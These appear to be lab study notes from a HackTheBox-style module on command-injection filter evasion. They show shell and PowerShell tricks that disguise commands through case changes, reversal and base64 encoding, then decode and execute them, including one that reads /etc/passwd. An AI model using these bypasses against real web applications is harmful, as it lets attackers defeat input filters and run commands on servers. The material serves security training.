## Case Manipulation

```cmd
PS C:\htb> WhOaMi 

21y4d
```

```shell
21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi") 

21y4d
```
#### Burp POST Request
![](Pasted%20image%2020260718124910.png)
Once we replace the spaces with tabs (`%09`), we see that the command works perfectly:
#### Burp POST Request
![](Pasted%20image%2020260718124940.png)

```bash
$(a="WhOaMi";printf %s "${a,,}")
```
## Reversed Commands

```shell
3kjS@htb[/htb]$ echo 'whoami' | rev 
imaohw
```

```shell
21y4d@htb[/htb]$ $(rev<<<'imaohw') 

21y4d
```
#### Burp POST Request
![](Pasted%20image%2020260718125044.png)

```powershell
PS C:\htb> "whoami"[-1..-20] -join '' 

imaohw
```

```powershell
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')" 

21y4d
```
## Encoded Commands

```shell
3kjS@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64 

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

```shell
3kjS@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```
#### Burp POST Request
![](Pasted%20image%2020260718125225.png)

```powershell
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami')) 

dwBoAG8AYQBtAGkA
```

```shell
3kjS@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64 

dwBoAG8AYQBtAGkA
```

```powershell
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))" 

21y4d
```
